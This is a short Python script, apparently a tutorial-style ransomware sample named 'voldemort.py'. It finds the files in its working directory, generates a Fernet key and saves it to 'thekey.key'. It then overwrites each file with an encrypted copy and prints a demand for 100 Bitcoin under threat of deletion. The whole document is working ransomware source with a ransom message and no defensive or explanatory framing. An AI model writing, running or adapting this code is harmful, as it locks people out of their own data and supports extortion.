import os
from cryptography.fernet import Fernet

#lets find some files

files = []

for file in os.listdir():
	if file == "voldemort.py" or file =="thekey.key" or file =="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)	

#generated a key
key = Fernet.generate_key()
#here we're referring to the file as hey, this file is called thekey
with open("thekey.key", "wb") as thekey:
#when we're working with this I want to write the variable key which we created earlier
        thekey.write(key)


for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("All of your files have been encrypted! Send me 100 Bitcoin or I'll delete them in 24 hours.")
